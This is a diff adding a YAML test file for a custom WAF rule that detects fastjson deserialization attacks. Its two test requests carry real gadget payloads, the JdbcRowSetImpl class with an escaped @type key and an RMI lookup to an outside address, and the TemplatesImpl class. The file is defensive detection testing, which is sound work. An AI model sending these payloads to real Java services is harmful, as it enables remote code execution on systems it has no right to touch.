@@ -1,0 +1,40 @@
+---
+meta:
+  author: "JiuZhang CUSTOM_PACK"
+  description: "fastjson escaped @type with known gadget class (1000644)"
+rule_id: 1000644
+tests:
+  - test_id: 1
+    desc: "\\u0040type escaped key with JdbcRowSetImpl gadget in form value"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/post"
+          data: 'j={"\u0040type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://10.0.0.1/x"}'
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [1000644]
+  - test_id: 2
+    desc: "TemplatesImpl class as JSON-parsed arg value"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: application/json
+          method: POST
+          port: 80
+          uri: "/post"
+          data: '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"}'
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [1000644]
